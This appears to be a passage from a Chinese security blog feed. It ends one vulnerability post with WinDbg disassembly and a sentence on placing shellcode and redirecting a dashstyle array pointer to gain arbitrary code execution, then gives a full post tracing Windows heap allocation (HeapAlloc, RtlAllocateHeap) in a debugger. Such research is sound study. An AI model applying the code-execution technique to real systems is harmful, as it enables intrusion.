class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">69104e9f 8b4808          mov     ecx,dword ptr [eax+8]</span><br><span class="line">69104ea2 8b4508          mov     eax,dword ptr [ebp+8]</span><br><span class="line">69104ea5 8b11            mov     edx,dword ptr [ecx]</span><br><span class="line">69104ea7 8b5270          mov     edx,dword ptr [edx+70h] ds:0023:4b5f5fbb=????????</span><br><span class="line">69104eaa 50              push    eax</span><br><span class="line">69104eab 53              push    ebx</span><br><span class="line">69104eac ffd2            call    edx</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x6B64;&#x6211;&#x4EEC;&#x5728;&#x6307;&#x5B9A;&#x7684;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x533A;&#x57DF;&#x8986;&#x76D6;&#x6211;&#x4EEC;&#x7684;shellcode&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BE5;&#x5730;&#x5740;-70h&#x8D4B;&#x503C;&#x7ED9;shape.dashstyle.array.item&#xFF0C;&#x5728;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;call&#x4E4B;&#x540E;&#x5C31;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x4EFB;&#x610F;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x3002;<p></p></body></html>]]></content>
      
      
      <categories>
          
          <category> vuls </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vuls </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HeapAlloc 由HeapAlloc看内存堆块的分配过程</title>
      <link href="/2017/02/25/HeapAlloc/"/>
      <url>/2017/02/25/HeapAlloc/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="&#x8C03;&#x8BD5;&#x73AF;&#x5883;"><a href="#&#x8C03;&#x8BD5;&#x73AF;&#x5883;" class="headerlink" title="&#x8C03;&#x8BD5;&#x73AF;&#x5883;"></a>&#x8C03;&#x8BD5;&#x73AF;&#x5883;</h3><p>Win7 32bit<br>Windbg<br>IDA Pro</p><h3 id="&#x8C03;&#x8BD5;&#x4EE3;&#x7801;"><a href="#&#x8C03;&#x8BD5;&#x4EE3;&#x7801;" class="headerlink" title="&#x8C03;&#x8BD5;&#x4EE3;&#x7801;"></a>&#x8C03;&#x8BD5;&#x4EE3;&#x7801;</h3><p>&#x51C6;&#x5907;&#x8DDF;&#x8FDB;HeapAlloc&#x770B;&#x770B;&#x5185;&#x5B58;&#x7684;&#x5206;&#x914D;&#x8FC7;&#x7A0B;&#x3002;&#x5BF9;&#x5E94;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;<br></p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">HANDLE heap ;</span><br><span class="line"></span><br><span class="line">heap = (<span class="hljs-keyword">int</span>*)HeapCreate(<span class="hljs-number">0</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0xfff</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">char</span> *p, *q ;</span><br><span class="line"><span class="hljs-keyword">int</span> <span class="hljs-built_in">size</span> = <span class="hljs-number">65533</span> ;</span><br><span class="line">__asm <span class="hljs-keyword">int</span> <span class="hljs-number">3</span></span><br><span class="line">p = (<span class="hljs-keyword">char</span>*)HeapAlloc(heap, <span class="hljs-number">0</span>, <span class="hljs-number">65533</span>) ;</span><br><span class="line">__asm <span class="hljs-keyword">int</span> <span class="hljs-number">3</span></span><br><span class="line">q = (<span class="hljs-keyword">char</span>*)HeapAlloc(heap, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) ;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><br>&#x56E0;&#x4E3A;&#x5206;&#x914D;&#x8FC7;&#x7A0B;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#xFF0C;&#x6D89;&#x53CA;&#x5230;&#x591A;&#x79CD;&#x53EF;&#x80FD;&#x60C5;&#x5F62;&#xFF0C;&#x56E0;&#x6B64;&#x6309;&#x7167;&#x4E0A;&#x8FF0;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x7A0B;&#x5E8F;&#x4EE5;&#x6B64;&#x8DDF;&#x8FDB;&#x3002;<br>&#x7B80;&#x5355;&#x770B;&#x4E00;&#x4E0B;&#x8FD9;&#x4E2A;&#x7A0B;&#x5E8F;&#xFF0C;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x79C1;&#x6709;&#x5806;&#xFF0C;&#x5927;&#x5C0F;&#x4E3A;0xfff&#xFF0C;&#x4E0D;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x7136;&#x540E;&#x5C1D;&#x8BD5;&#x7533;&#x8BF7;&#x4E00;&#x4E2A;&#x5927;&#x5806;&#x5757;&#xFF0C;&#x89C2;&#x5BDF;&#x5206;&#x914D;&#x8FC7;&#x7A0B;&#x3002;<br>HeapCreate&#x7533;&#x8BF7;&#x6700;&#x5927;&#x5927;&#x5C0F;&#x4E3A;0xfff&#xFF0C;&#x6309;&#x7167;&#x5206;&#x914D;&#x7684;&#x5FC5;&#x987B;&#x662F;&#x4E00;&#x4E2A;&#x9875;&#x7684;&#x6574;&#x6570;&#x500D;&#xFF0C;&#x56E0;&#x6B64;&#x6269;&#x5C55;&#x4E3A;&#x4E00;&#x4E2A;&#x666E;&#x901A;&#x9875;(0x1000) 4KB.<br><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap -h</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  1:   00160000 </span><br><span class="line">    Segment at 00160000 to 00260000 (00003000 bytes committed)</span><br><span class="line">  2:   00010000 </span><br><span class="line">    Segment at 00010000 to 00020000 (00001000 bytes committed)</span><br><span class="line">  3:   00020000 </span><br><span class="line">    Segment at 00020000 to 00030000 (00010000 bytes committed)</span><br><span class="line">  4:   00570000 </span><br><span class="line">    Segment at 00570000 to 00580000 (00003000 bytes committed)</span><br><span class="line">  5:   00760000 </span><br><span class="line">    Segment at 00760000 to 00761000 (00001000 bytes committed)</span><br><span class="line">0:000&gt; r eax</span><br><span class="line">eax=00760000</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x8C03;&#x7528;ntdll-RtlAllocateHeap-HANDLE-HeapHandle-ULONG-Flags-ULONG-Size"><a href="#&#x8C03;&#x7528;ntdll-RtlAllocateHeap-HANDLE-HeapHandle-ULONG-Flags-ULONG-Size" class="headerlink" title="&#x8C03;&#x7528;ntdll!RtlAllocateHeap(HANDLE HeapHandle, ULONG Flags, ULONG Size)"></a>&#x8C03;&#x7528;ntdll!RtlAllocateHeap(HANDLE HeapHandle, ULONG Flags, ULONG Size)</h3><p>&#x4F1A;&#x6709;&#x4E00;&#x4E9B;&#x5224;&#x65AD;&#x5904;&#x7406;&#xFF0C;&#x56E0;&#x4E3A;&#x4E2D;&#x95F4;&#x8FC7;&#x7A0B;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x4EC5;&#x6309;&#x7167;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x63CF;&#x8FF0;&#x4E0B;&#x57FA;&#x672C;&#x6D41;&#x7A0B;&#x3002;&#x9996;&#x5148;&#x662F;&#x5982;&#x679C;&#x7533;&#x8BF7;&#x7684;&#x5927;&#x5C0F;&#x5927;&#x4E8E;0x7fffffff&#xFF0C;&#x76F4;&#x63A5;&#x5206;&#x914D;&#x9519;&#x8BEF;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x6700;&#x5927;&#x5927;&#x5C0F;&#x9650;&#x5236;(32&#x4F4D;&#x6700;&#x5927;2G&#x7528;&#x6237;&#x5730;&#x5740;&#x7A7A;&#x95F4;)&#x3002;<br><img src="/images/HeapAlloc/freelist.PNG" alt="RtlAllocateHeap-FreeLists"><br>&#x7136;&#x540E;&#x662F;&#x67E5;&#x7A7A;&#x8868;&#xFF0C;&#x8FD9;&#x91CC;[eax+4]&#x5B58;&#x653E;&#x7684;&#x662F;0x80&#xFF0C;&#x4E5F;&#x5C31;&#x662F;128&#xFF0C;&#x5BF9;&#x5E94;&#x7684;&#x662F;&#x7A7A;&#x8868;&#x6807;&#x53F7;&#xFF0C;&#x5982;&#x6807;&#x53F7;1&#x5B58;&#x653E;&#x7684;&#x662F;8 bytes&#xFF0C;&#x90FD;&#x662F;&#x6807;&#x53F7;&#x7684;8&#x500D;&#xFF1B;ecx&#x662F;&#x5DF2;&#x7ECF;&#x9664;&#x4EE5;8&#xFF0C;&#x56E0;&#x6B64;&#x5982;&#x679C;&#x8BE5;&#x503C;&#x6BD4;&#x5927;&#x4E8E;&#x7B49;&#x4E8E;128&#xFF0C;&#x5219;&#x8BF4;&#x660E;&#x4ECE;freelists[1-127]&#x4E2D;&#x90FD;&#x4E0D;&#x5B58;&#x5728;&#x5408;&#x9002;&#x7684;&#x5757;&#xFF0C;&#x7136;&#x540E;&#x5C1D;&#x8BD5;&#x5728;freelist[0]&#x4E2D;&#x67E5;&#x627E;&#xFF0C;&#x8FD9;&#x91CC;&#x8DF3;&#x8F6C;&#x5230;loc_77F166FF&#xFF0C;&#x8FD9;&#x91CC;&#x63D0;&#x53D6;&#x4E00;&#x4E0B;&#x8FD9;&#x91CC;&#x7684;&#x903B;&#x8F91;&#xFF0C;&#x5927;&#x81F4;&#x80FD;&#x591F;&#x731C;&#x6D4B;eax&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x94FE;&#x63A5;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;&#x5806;&#x5757;&#x7684;&#x6307;&#x9488;&#xFF0C;&#x800C;eax+4&#x5B58;&#x653E;&#x7684;&#x662F;&#x8BE5;&#x5806;&#x5757;&#x7684;&#x5927;&#x5C0F;&#x3002;&#x5F53;[eax]&#x4E3A;&#x7A7A;&#x8868;&#x793A;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x4E0B;&#x4E00;&#x4E2A;&#x4E86;&#xFF0C;&#x4E0D;&#x4E3A;&#x7A7A;&#x5C31;&#x4E00;&#x76F4;&#x5BFB;&#x627E;&#x4E00;&#x4E2A;&#x5408;&#x9002;&#x7684;&#x3002;<br><img src="/images/HeapAlloc/freelist-2.PNG" alt="RtlAllocateHeap-FreeLists"><br>&#x5F53;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x5408;&#x9002;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x91CC;&#x7684;&#x60C5;&#x5F62;&#xFF0C;&#x5C06;&#x5F00;&#x59CB;&#x8C03;&#x7528;RtlpAllocateHeap&#x8FDB;&#x884C;&#x5185;&#x5B58;&#x5206;&#x914D;&#x3002;<br>&#x6CE8;&#xFF1A;<br>&#x4E2D;&#x95F4;&#x4F1A;&#x5C06;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x6269;&#x5C55;&#x4E3A;8 bytes&#x7684;&#x500D;&#x6570;&#xFF0C;&#x56E0;&#x4E3A;&#x7533;&#x8BF7;&#x65F6;&#x9ED8;&#x8BA4;&#x7684;&#x5206;&#x914D;&#x7C92;&#x5EA6;&#x4E3A;8&#xFF0C;&#x5373;&#x8FD9;&#x91CC;&#x7684;Granularity&#x3002;<br></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !heap 760000 -v</span><br><span class="line">Index   Address  Name      Debugging options enabled</span><br><span class="line">  5:   00760000 </span><br><span class="line">    Segment at 00760000 to 00761000 (00001000 bytes committed)</span><br><span class="line">    Flags:                00001000</span><br><span class="line">    ForceFlags:           00000000</span><br><span class="line">    Granularity:          8 bytes</span><br><span class="line">    Segment Reserve:      00100000</span><br><span class="line">    Segment Commit:       00002000</span><br><span class="line">    DeCommit Block Thres: 00000200</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="&#x8C03;&#x7528;RtlpAllocateHeap-int-ULONG-AllocationSize-int-int"><a href="#&#x8C03;&#x7528;RtlpAllocateHeap-int-ULONG-AllocationSize-int-int" class="headerlink" title="&#x8C03;&#x7528;RtlpAllocateHeap(int, ULONG AllocationSize, int, int)"></a>&#x8C03;&#x7528;RtlpAllocateHeap(int, ULONG AllocationSize, int, int)</h3><p>edx: dwFlags or 2<br>ecx, ebx: Handle<br>&#x4F20;&#x5165;&#x7684;&#x53C2;&#x6570;&#x4E3A;: (int, )(&#x7533;&#x8BF7;&#x5206;&#x914D;&#x7684;&#x5927;&#x5C0F;, 8&#x5B57;&#x8282;&#x500D;&#x6570;&#x5904;&#x7406;, [ebp-0x10], esi)<br>&#x524D;&#x9762;&#x4E00;&#x4E9B;&#x5927;&#x5C0F;&#x5224;&#x65AD;&#xFF0C;&#x662F;&#x5426;&#x4E3A;0&#x4E4B;&#x7C7B;&#x7684;&#x4E5F;&#x548C;RtlAllocateHeap&#x7C7B;&#x4F3C;&#xFF0C;&#x4E0D;&#x518D;&#x8D58;&#x8FF0;&#xFF1B;&#x7136;&#x540E;&#x662F;&#x4E00;&#x4E9B;&#x4E34;&#x754C;&#x533A;&#x7684;&#x4F7F;&#x7528;&#x5224;&#x65AD;&#xFF0C;RtlTryEnterCriticalSection&#xFF0C;&#x5C1D;&#x8BD5;&#x8FDB;&#x5165;&#x4E00;&#x4E2A;&#x4E34;&#x754C;&#x533A;(critical section)&#xFF0C;&#x8FD4;&#x56DE;True&#x8868;&#x793A;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE; False&#x8868;&#x793A;&#x88AB;&#x5176;&#x4ED6;&#x7EBF;&#x7A0B;&#x5360;&#x7528;&#xFF0C;&#x8FD9;&#x4E5F;&#x4E0D;&#x91CD;&#x8981;&#xFF1B;&#x7136;&#x540E;&#x4E0E;VirtualMemoryThreshold&#x5224;&#x65AD;&#xFF0C;VirtualMemoryThreshold&#x662F;&#x80FD;&#x591F;&#x5206;&#x914D;&#x7684;&#x6700;&#x5927;&#x503C;(32&#x4F4D;&#x4E3A;0xfe00 &#x7C92;&#x5EA6;&#x4E3A;8)&#xFF0C;&#x8FD9;&#x4E2A;&#x7F51;&#x4E0A;&#x6709;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#xFF1B;&#x8FD9;&#x91CC;&#x7533;&#x8BF7;&#x5C0F;&#x4E8E;&#x8BE5;&#x6700;&#x5927;&#x503C;&#xFF0C;&#x7EE7;&#x7EED;&#x5C06;&#x5728;&#x4E0B;&#x56FE;&#x4E00;&#x6B21;&#x5224;&#x65AD;&#x4E2D;&#x8C03;&#x7528;RtlpExtendHeap&#xFF0C;&#x8FD9;&#x91CC;[ebp+var_38] &#x4E0E; esi&#x7684;&#x503C;&#x5747;&#x4E3A;007600c4&#xFF0C;&#x8FD9;&#x662F;&#x5806;&#x53E5;&#x67C4;+0xc4&#x504F;&#x79FB;&#xFF0C;&#x6307;&#x5411;&#x7684;&#x662F;FreeLists&#xFF0C;&#x8FD9;&#x91CC;&#x5224;&#x65AD;&#x73B0;&#x5728;&#x8FD8;&#x4E0D;&#x7406;&#x89E3;&#x3002;<br><img src="/images/HeapAlloc/RtlpAllocateHeap.PNG" alt="RtlpExtendHeap"></p><h3 id="&#x8FDB;&#x5165;ntdll-RtlpExtendHeap-ULONG-FreeSize-int"><a href="#&#x8FDB;&#x5165;ntdll-RtlpExtendHeap-ULONG-FreeSize-int" class="headerlink" title="&#x8FDB;&#x5165;ntdll!RtlpExtendHeap(ULONG FreeSize, int)"></a>&#x8FDB;&#x5165;ntdll!RtlpExtendHeap(ULONG FreeSize, int)</h3><p>&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x5806;&#x53E5;&#x67C4;&#xFF0C;<br>&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;0x10008, &#x5373;&#x7533;&#x8BF7;&#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5206;&#x914D;&#x7C92;&#x5EA6;&#x4E3A;8 bytes&#xFF0C;&#x56E0;&#x6B64;65533&#x6269;&#x5C55;&#x4E3A;0x10008<br>&#x8BE5;&#x51FD;&#x6570;&#x7684;&#x6267;&#x884C;&#x6D41;&#x7A0B;&#x4E3A;&#x9996;&#x5148;&#x8C03;&#x7528;RtlpFindAndCommitPages&#x63D0;&#x4EA4;&#x5927;&#x5C0F;&#x7684;&#x7533;&#x8BF7;&#xFF0C;&#x7533;&#x8BF7;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x4E3A;&#x975E;0&#xFF0C;&#x5931;&#x8D25;&#x5219;&#x8FD4;&#x56DE;0&#xFF1B;&#x82E5;&#x5931;&#x8D25;&#x5219;&#x7EE7;&#x7EED;&#x5224;&#x65AD;&#x8BE5;&#x5806;&#x5757;&#x662F;&#x5426;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#x5C06;&#x7EE7;&#x7EED;&#x6269;&#x5C55;&#x5206;&#x914D;&#x7533;&#x8BF7;&#xFF0C;&#x4E0D;&#x53EF;&#x6269;&#x5C55;&#x5C06;&#x5206;&#x914D;&#x5931;&#x8D25;&#xFF0C;&#x8FD4;&#x56DE;&#x4E3A;0&#x3002;<br><img src="/images/HeapAlloc/RtlpExtendHeap_1.PNG" alt="RtlpExtendHeap"><br>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x7533;&#x8BF7;&#x8FC7;&#x5927;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x7A7A;&#x95F2;&#x7A7A;&#x95F4;&#x4F9B;&#x7533;&#x8BF7;&#xFF0C;&#x56E0;&#x6B64;&#x8FD4;&#x56DE;0; &#x5C06;&#x7EE7;&#x7EED;&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EF;&#x589E;&#x957F;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5728;heapHandle+0x40&#x5904;&#x4FDD;&#x5B58;&#x80FD;&#x5426;&#x589E;&#x957F;&#xFF0C;&#x4E3A;2&#x8868;&#x793A;&#x53EF;&#x589E;&#x957F;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3A;0&#x3002;&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8981;&#x5408;&#x5E76;&#x5806;&#x5757;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x5224;&#x65AD;&#x662F;&#x5426;&#x4E3A;0x80&#xFF0C;&#x4E3A;0x80&#x5C06;&#x8FDB;&#x884C;&#x5806;&#x5757;&#x6269;&#x5C55;&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x8C03;&#x7528;&#x7A7A;&#x95F2;&#x5806;&#x5757;&#x5408;&#x5E76;&#x3002;<br><img src="/images/HeapAlloc/RtlpExtendHeap_2.PNG" alt="RtlpExtendHeap-RtlpCoalesceHeap"><br>&#x8FD9;&#x91CC;&#x6D41;&#x7A0B;&#x6BD4;&#x8F83;&#x6E05;&#x695A;&#xFF0C;&#x8981;&#x662F;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x6216;&#x8005;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x4ECD;&#x4E0D;&#x80FD;&#x6EE1;&#x8DB3;&#x5206;&#x914D;&#xFF0C;&#x5C06;eax&#x7F6E;0&#x540E;&#x8FD4;&#x56DE;&#xFF0C;&#x5426;&#x5219;&#x5C06;&#x8FD4;&#x56DE;&#x5206;&#x914D;&#x7684;eax&#x3002;&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;+0x80 = 0&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x4F1A;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#xFF0C;&#x76F4;&#x63A5;&#x8FD4;&#x56DE;eax=0&#x3002;&#x5C1D;&#x8BD5;&#x5206;&#x914D;&#x5931;&#x8D25;&#x3002;</p><h3 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h3><p>&#x8FD9;&#x91CC;&#x56E0;&#x4E3A;&#x662F;&#x6709;&#x5B9E;&#x9645;&#x7684;&#x9700;&#x8981;&#x5224;&#x65AD;&#x5F53;&#x7533;&#x8BF7;&#x5206;&#x914D;&#x5927;&#x4E8E;&#x5806;&#x5927;&#x5C0F;&#x7684;&#x5806;&#x5757;&#x65F6;&#xFF0C;&#x5806;&#x7BA1;&#x7406;&#x7ED3;&#x6784;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x56E0;&#x6B64;&#x5173;&#x6CE8;&#x7684;&#x4EE3;&#x7801;&#x53EA;&#x662F;&#x5806;&#x7BA1;&#x7406;&#x7ED3;&#x6784;&#x7684;&#x5F88;&#x5C0F;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x6D41;&#x7A0B;&#x3002;<br>&#x5927;&#x81F4;&#x603B;&#x7ED3;&#x4E3A;&#xFF1A;&#x5F53;HeapCreate&#x7533;&#x8BF7;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x79C1;&#x6709;&#x5806;&#x65F6;&#xFF0C;&#x6307;&#x5B9A;&#x5927;&#x5C0F;&#x540E;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x5C06;&#x5176;&#x6269;&#x5C55;&#x4E3A;&#x9875;&#x5927;&#x5C0F;(4K)&#x7684;&#x6574;&#x6570;&#x500D;&#x3002;&#x7136;&#x540E;&#x4F7F;&#x7528;HeapAlloc&#x7533;&#x8BF7;&#x5806;&#x5757;&#x65F6;&#xFF0C;&#x5C06;&#x8FDB;&#x5165;ntdll!RtlAllocateHeap&#x4E2D;&#x8FDB;&#x884C;&#x5B9E;&#x9645;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x8FD9;&#x91CC;&#x4F1A;&#x6709;&#x4E00;&#x4E9B;&#x5904;&#x7406;&#x5224;&#x65AD;&#x4E4B;&#x7C7B;&#x7684;&#xFF0C;&#x5173;&#x952E;&#x4E00;&#x90E8;&#x5206;&#x662F;&#x5C06;&#x5176;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x6269;&#x5C55;&#x4E3A;8 bytes&#x7684;&#x6574;&#x6570;&#x500D;&#x3002;&#x7136;&#x540E;&#x8FDB;&#x5165;RtlpAllocateHeap&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x56E0;&#x4E3A;&#x8FC7;&#x5927;&#xFF0C;&#x56E0;&#x6B64;&#x4E5F;&#x4F1A;&#x5728;&#x5404;&#x79CD;&#x5C1D;&#x8BD5;&#x4E4B;&#x540E;&#x8C03;&#x7528;ntdll!RtlpExtendHeap&#x5C1D;&#x8BD5;&#x6269;&#x5C55;&#x5806;&#xFF0C;&#x5F53;&#x6269;&#x5C55;&#x5931;&#x8D25;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x5206;&#x914D;&#x5931;&#x8D25;&#x3002;&#x672C;&#x6B21;&#x8C03;&#x8BD5;&#x7684;&#x5173;&#x6CE8;&#x70B9;&#x5728;&#x4E8E;&#x5F53;&#x7533;&#x8BF7;&#x5206;&#x914D;&#x8FC7;&#x5927;&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x7834;&#x574F;&#x5806;&#x7ED3;&#x6784;&#xFF0C;&#x5F53;&#x4E0D;&#x8BBE;&#x7F6E;HEAP_GENERATE_EXCEPTIONS&#x65F6;&#xFF0C;&#x90A3;&#x4E48;&#x5206;&#x914D;&#x5931;&#x8D25;&#x53EA;&#x4F1A;&#x8FD4;&#x56DE;eax=0&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x540E;&#x9762;&#x5806;&#x5757;&#x7684;&#x5206;&#x914D;&#x3002;</p><h3 id="&#x5806;&#x4FE1;&#x606F;"><a href="#&#x5806;&#x4FE1;&#x606F;" class="headerlink" title="&#x5806;&#x4FE1;&#x606F;"></a>&#x5806;&#x4FE1;&#x606F;</h3><p></p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _heap 760000</span><br><span class="line">ntdll!_HEAP</span><br><span class="line">   +0x000 Entry            : _HEAP_ENTRY</span><br><span class="line">   +0x008 SegmentSignature : 0xffeeffee</span><br><span class="line">   +0x00c SegmentFlags     : 0</span><br><span class="line">   +0x010 SegmentListEntry : _LIST_ENTRY [ 0x7600a8 - 0x7600a8 ]</span><br><span class="line">   +0x018 Heap             : 0x00760000 _HEAP</span><br><span class="line">   +0x01c BaseAddress      : 0x00760000 </span><br><span class="line">   +0x020 NumberOfPages    : 1</span><br><span class="line">   +0x024 FirstEntry       : 0x00760588 _HEAP_ENTRY</span><br><span class="line">   +0x028 LastValidEntry   : 0x00761000 _HEAP_ENTRY</span><br><span class="line">   +0x02c NumberOfUnCommittedPages : 0</span><br><span class="line">   +0x030 NumberOfUnCommittedRanges : 1</span><br><span class="line">   +0x034 SegmentAllocatorBackTraceIndex : 0</span><br><span class="line">   +0x036 Reserved         : 0</span><br><span class="line">   +0x038 UCRSegmentList   : _LIST_ENTRY [ 0x760ff0 - 0x760ff0 ]</span><br><span class="line">   +0x040 Flags            : 0x1000</span><br><span class="line">   +0x044 ForceFlags       : 0</span><br><span class="line">   +0x048 CompatibilityFlags : 0</span><br><span class="line">   +0x04c EncodeFlagMask   : 0x100000</span><br><span class="line">   +0x050 Encoding         : _HEAP_ENTRY</span><br><span class="line">   +0x058 PointerKey       : 0x75c3eb7</span><br><span class="line">   +0x05c Interceptor      : 0</span><br><span class="line">   +0x060 VirtualMemoryThreshold : 0xfe00</span><br><span class="line">   +0x064 Signature        : 0xeeffeeff</span><br><span class="line">   +0x068 SegmentReserve   : 0x100000</span><br><span class="line">   +0x06c SegmentCommit    : 0x2000</span><br><span class="line">   +0x070 DeCommitFreeBlockThreshold : 0x200</span><br><span class="line">   +0x074 DeCommitTotalFreeThreshold : 0x2000</span><br><span class="line">   +0x078 TotalFreeSize    : 0x14b</span><br><span class="line">   +0x07c MaximumAllocationSize : 0x7ffdefff</span><br><span class="line">   +0x080 ProcessHeapsListIndex : 5</span><br><span class="line">   +0x082 HeaderValidateLength : 0x138</span><br><span class="line">   +0x084 HeaderValidateCopy : (null) </span><br><span class="line">   +0x088 NextAvailableTagIndex : 0</span><br><span class="line">   +0x08a MaximumTagIndex  : 0</span><br><span class="line">   +0x08c TagEntries       : (null) </span><br><span class="line">   +0x090 UCRList          : _LIST_ENTRY [ 0x760090 - 